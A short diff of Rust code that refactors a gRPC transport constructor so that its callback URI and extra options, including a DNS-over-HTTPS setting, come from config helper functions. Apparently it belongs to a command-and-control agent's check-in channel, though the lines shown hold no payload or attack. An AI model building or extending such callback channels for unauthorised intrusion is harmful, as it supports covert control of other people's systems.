@@ -38,28 +38,12 @@ impl Transport for GRPC {
         GRPC { grpc: None }
     }
 
-    fn new(callback: String, config: Config) -> Result<Self> {
-        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
+    fn new(config: Config) -> Result<Self> {
+        // Extract URI and EXTRA from config using helper functions
+        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let extra_map = crate::transport::extract_extra_from_config(&config);
 
-        // Parse the EXTRA map
-        let extra_map: HashMap<String, String> = if let Some(info) = config.info {
-            if let Some(available_transports) = info.available_transports {
-                let active_idx = available_transports.active_index as usize;
-                if let Some(transport) = available_transports
-                    .transports
-                    .get(active_idx)
-                    .or_else(|| available_transports.transports.first())
-                {
-                    serde_json::from_str::<HashMap<String, String>>(&transport.extra)?
-                } else {
-                    HashMap::new()
-                }
-            } else {
-                HashMap::new()
-            }
-        } else {
-            HashMap::new()
-        };
+        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
 
         #[cfg(feature = "grpc-doh")]
         let doh: Option<&String> = extra_map.get("DOH");
